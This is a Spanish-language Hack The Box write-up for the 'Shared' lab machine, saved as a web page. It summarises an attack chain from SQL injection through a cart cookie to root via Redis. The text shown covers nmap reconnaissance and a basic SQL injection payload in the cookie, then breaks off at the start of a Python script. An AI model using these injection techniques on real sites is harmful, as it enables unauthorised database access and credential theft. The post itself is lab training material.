<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/ico" href="/favicon.ico"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/shared/"><!-- Primary Meta Tags --><title>Shared - HTB Writeup • Fullaw4ke Blog</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Shared - HTB Writeup • Fullaw4ke Blog"><meta name="description" content="Contiene una Web Vulnerable a SQLI, la cual usamos para ver credenciales de James. Luego abusamos de Redis para conseguir ROOT."><meta name="author" content="Fullaw4ke"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/shared/"><meta property="og:title" content="Shared - HTB Writeup"><meta property="og:description" content="Contiene una Web Vulnerable a SQLI, la cual usamos para ver credenciales de James. Luego abusamos de Redis para conseguir ROOT."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/image.uRkMvmWw.png"><meta property="article:author" content="Fullaw4ke"><meta property="article:published_time" content="2022-07-02T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/shared/"><meta property="twitter:title" content="Shared - HTB Writeup"><meta property="twitter:description" content="Contiene una Web Vulnerable a SQLI, la cual usamos para ver credenciales de James. Luego abusamos de Redis para conseguir ROOT."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/image.uRkMvmWw.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Fullaw4ke Blog" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728652588680; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.oLAkEadO.css" />
<link rel="stylesheet" href="/_astro/_slug_.m5WJ7WE5.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://x.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2022-07-02T04:00:00.000Z"> Jul 2, 2022 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 9 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Shared - HTB Writeup </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/easy" aria-label="Easy"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Easy </span> </a> </div> </header> <img src="/_astro/image.uRkMvmWw_1J3Go1.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[500px] my-8 object-cover" alt="img of Shared - HTB Writeup" width="1000" height="500" decoding="async"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/shared/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/shared/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#initial-recon" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Initial Recon </a>  </li><li class="flex flex-col"> <a href="#walking-the-application" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Walking the Application </a>  </li><li class="flex flex-col"> <a href="#investigación-de-la-funcionalidad" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Investigación de la funcionalidad </a>  </li><li class="flex flex-col"> <a href="#descubrimiento-de-vulnerabilidades" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Descubrimiento de vulnerabilidades </a>  </li><li class="flex flex-col"> <a href="#web-exploitation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Web Exploitation </a>  </li><li class="flex flex-col"> <a href="#union-query-exfiltration" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Union Query Exfiltration </a>  </li><li class="flex flex-col"> <a href="#lateral-movement" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Lateral Movement </a>  </li><li class="flex flex-col"> <a href="#cve-2022-21699" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> CVE-2022-21699 </a>  </li><li class="flex flex-col"> <a href="#exploitation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Exploitation </a>  </li><li class="flex flex-col"> <a href="#privilege-escalation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Privilege Escalation </a>  </li><li class="flex flex-col"> <a href="#redis" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Redis </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <p>Shared es una máquina Linux mediana creada por Nauten en Hack The Box que presenta un sitio web con un nombre de host virtual que es vulnerable a la inyección SQL. La explotación exitosa de esta vulnerabilidad nos proporciona la contraseña de un usuario llamado james_mason. Con estas credenciales somos capaces de iniciar sesión a través de SSH y elevar privilegios a un usuario llamado dan_smith explotando un cron job que utiliza una versión de ipython que es vulnerable a CVE-2022-21699. A continuación, aplicamos ingeniería inversa a un ejecutable utilizando análisis estáticos y dinámicos para recuperar la contraseña del servicio local Redis. El proceso Redis se ejecuta como root, por lo que cargamos un módulo especial de objetos compartidos utilizando LOAD MODULE para ejecutar comandos como root.</p>
<h1 id="initial-recon">Initial Recon</h1>
<p>Primero configuremos nuestro entorno y ejecutemos un escaneo de puertos TCP con esta envoltura nmap personalizada.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Mil4ne@Kali</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#C792EA">export</span><span style="color:#B07D48;--shiki-dark:#BABED8"> rhost</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.10.x</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sS</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p-</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --open</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --min-rate</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 3000</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -vvv</span><span style="color:#B07D48;--shiki-dark:#BABED8">  $rhost</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -oG</span><span style="color:#B56959;--shiki-dark:#C3E88D"> nmap</span></span></code></pre> 
<p>El análisis informa de que los servicios SSH, HTTP y HTTPS se ejecutan en los puertos 22, 80 y 443 respectivamente.
Web Recon</p>
<p>Al visitar el puerto 80, se nos redirige a shared.htb. Añadamos este nombre de host a nuestro archivo <code>/etc/hosts</code> con la dirección IP correspondiente.</p>
<p>Ahora visitaremos <a href="https://shared.htb/">https://shared.htb/</a> en una sesión de navegador proxy a través del proxy HTTP BurpSuite.</p>
<p>Página de índice Página de índice de la web <code>shared.htb</code></p>
<h2 id="walking-the-application">Walking the Application</h2>
<p>Al explorar el contenido del sitio web, descubrimos la página de pago en /index.php?controller=cart&amp;action=show. Cuando pasamos el ratón por encima del botón de pago, podemos ver que nos enviará a <a href="https://checkout.shared.htb">https://checkout.shared.htb</a>. Añadamos este nombre de host virtual a nuestro archivo /etc/hosts para poder ver su contenido.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">sudo</span><span style="color:#B56959;--shiki-dark:#C3E88D"> sed</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -E</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -i</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">s/(shared.htb).*/\1 checkout.\1/</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /etc/hosts</span></span></code></pre> 
<p>Ahora, cuando añadamos un artículo a nuestro carrito y naveguemos a /index.php?controller=cart&amp;action=show, haremos clic en el botón de pago para ser redirigidos al sitio de pago.</p>
<h2 id="investigación-de-la-funcionalidad">Investigación de la funcionalidad</h2>
<p>Es interesante cómo este sitio es capaz de determinar qué artículo teníamos en nuestro carrito teniendo en cuenta que no proporcionamos ningún parámetro HTTP GET o POST. Vamos a investigar.</p>
<p>Observando la solicitud inicial que enviamos al sitio de pago en el mapa del sitio de BurpSuite, podemos ver que nuestra solicitud contiene una cookie inusual llamada custom_cart. El valor de esta cookie se puede descifrar automáticamente resaltándolo, revelando un objeto JSON con el código de producto y la cantidad del artículo de pago.</p>
<p>Encontramos una misteriosa cookie en BurpSuite</p>
<p>Podemos deducir que el sitio utiliza el código de producto suministrado en custom_cart para encontrar el precio del artículo, ya que no suministramos el precio, sino sólo el código de producto. Es probable que esta actividad sea gestionada por algún tipo de solución de base de datos, como un servidor SQL. Teniendo esto en cuenta, podemos comprobar si esta funcionalidad es vulnerable a la inyección SQL.</p>
<h2 id="descubrimiento-de-vulnerabilidades">Descubrimiento de vulnerabilidades</h2>
<p>Introduzcamos algunas cargas útiles básicas de inyección SQL en la cookie de la pestaña de repetición de BurpSuite para ver si es posible la inyección SQL.</p>
<p>Respuesta del servidor a una carga útil de inyección SQL común</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">{</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;CRAAFTKP&#39;#&quot;</span><span style="color:#998418;--shiki-dark:#82AAFF">:</span><span style="color:#59873A;--shiki-dark:#FFCB6B">&quot;1&quot;</span><span style="color:#59873A;--shiki-dark:#FFCB6B">}</span></span></code></pre> 
<p>La respuesta a la primera carga útil sugiere que la inyección SQL es posible, pero podemos asegurarnos enviando una carga útil que debería evaluarse como falsa, y otra que debería ser verdadera.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#!/usr/bin/env python3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">from</span><span style="color:#B56959;--shiki-dark:#C3E88D"> urllib.parse</span><span style="color:#B56959;--shiki-dark:#C3E88D"> import</span><span style="color:#B56959;--shiki-dark:#C3E88D"> quote</span></span>
